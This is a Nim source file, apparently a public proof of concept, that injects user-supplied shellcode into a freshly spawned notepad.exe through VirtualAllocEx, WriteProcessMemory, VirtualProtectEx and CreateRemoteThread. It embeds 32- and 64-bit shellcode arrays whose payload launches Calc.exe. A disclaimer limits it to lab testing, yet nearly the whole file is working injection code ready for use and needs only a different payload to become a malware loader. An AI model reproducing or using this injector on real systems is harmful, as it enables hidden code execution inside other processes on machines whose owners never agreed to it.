
#[
    Author: Sam Sepiol, Twitter: @5epi0l

    Description: This is a POC for a shellcode injector written in nim that spawns a remote process,  injects the
    user-provided shellcode into the memory space of the remote process and executes it.
    
    Disclaimer:  This POC has been developed for development and testing purposes only. No attempts of AV/EDR evasion have been made .
    Run it within your own controlled lab-environment.
         
]#

import winim/lean
import osproc
import strformat

proc injectRemote[I, T](shellcode: array[I, T]): void =
    write(stdout, "[+]Spawning a process...\n")
    let spawnedProcess  = startProcess("notepad.exe")
    let PID: DWORD = cast[int32](spawnedProcess.processID)



    write(stdout, "[+]Process Spawned with PID : ",spawnedProcess.processID)

    write(stdout, "[+]\nOpening a handle to the process...\n")
    let pHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        false,
        PID

    )
    write(stdout, "[+]Handler opened at : ", pHandle)
    write(stdout, "[+]\nAttempting to allocate memory within the spawned process...\n")
    let memAddr = VirtualAllocEx(
        pHandle,
        NULL,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_READWRITE
        )
    
    write(stdout, "[+]Writing the shellcode into memory...\n")

    var BytesWritten: SIZE_T

    let processMem = WriteProcessMemory(
        pHandle,
        memAddr,
        unsafeAddr shellcode,
        cast[SIZE_T](shellcode.len),
        addr BytesWritten
    )

    if(processMem):
        write(stdout, &"[+]Success, Wrote {BytesWritten} bytes into memory\n")
    else:
        write(stdout, "\n[-]Error writing into memory\n")
        quit(QuitFailure)
    
    write(stdout, "[+]Changing the permissions of the memory space\n")
    
    var PrevPro: DWORD = 0

    let virPro = VirtualProtectEx(
        pHandle,
        memAddr,
        cast[SIZE_T](shellcode.len),
        PAGE_EXECUTE_READ,
        addr PrevPro
    )

    if (virPro):
        write(stdout, "[+]Success! The page permissions are now PAGE_EXECUTE_READ\n")
    else:
        write(stdout, "[-]Could not alter the page permissions!\n")
        quit(QuitFailure)
    
    write(stdout, "[+]Initiating a remote thread...\n")

    var threadID: DWORD = 0
    let threadH = CreateRemoteThread(
        pHandle,
        NULL,
        0,
        cast[LPTHREAD_START_ROUTINE](memAddr),
        NULL,
        0,
        addr threadID
    )

    write(stdout, "[+]Execution Successful\n")

    defer:CloseHandle(pHandle)
    defer:CloseHandle(threadH)

    write(stdout, "[+]Clening UP\n")

when defined(windows):

    when defined(i386):
        var shellcode: array[213, byte] = [
        byte 0xfc,0xe8,0x82,0x00,0x00,0x00,
        0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,
        0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
        0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,
        0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,
        0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,
        0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
        0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
        0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,
        0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,
        0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,
        0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
        0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,
        0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,
        0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x43,0x3a,
        0x5c,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x53,0x79,0x73,
        0x74,0x65,0x6d,0x33,0x32,0x5c,0x43,0x61,0x6c,0x63,0x2e,0x65,
        0x78,0x65,0x00]

    when defined(amd64):
        var shellcode: array[296, byte] = [
        byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
        0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
        0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
        0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
        0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
        0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
        0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
        0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
        0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
        0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
        0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,
        0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
        0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
        0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x43,0x3a,0x5c,
        0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x5c,0x53,0x79,0x73,0x74,
        0x65,0x6d,0x33,0x32,0x5c,0x43,0x61,0x6c,0x63,0x2e,0x65,0x78,
        0x65,0x00]

        when isMainModule:
            injectRemote(shellcode)


